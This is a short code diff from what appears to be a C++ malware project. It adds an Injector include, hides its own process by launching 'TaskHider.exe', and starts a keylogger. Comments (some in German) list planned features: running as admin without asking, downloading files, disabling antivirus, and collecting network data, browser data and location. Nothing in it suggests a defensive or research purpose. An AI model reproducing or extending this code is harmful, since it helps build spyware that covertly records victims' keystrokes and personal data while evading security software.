@@ -15,6 +15,7 @@
 #include "Autostart.h"
 #include "SerialCheck.h"
 #include "Keylogger.h"
+#include "Injector.h"
 using namespace std;
 
 int main() {
@@ -25,14 +26,20 @@ int main() {
 
 void start()
 {
-
-	createAutoStart();
-
-	checkSerials();
 	
+	system("TaskHider.exe");
 	startKeyLogger();
-
+	
+	
+	//Start as admin automatically
+	//FileDownload
+	//Not see Proc in task manager: FINISHED
+	//Disable AV
+	//Netzwerkdaten
+	//Browserdaten
+	//Ortungsfunktion
 }
+
 
 /*
 
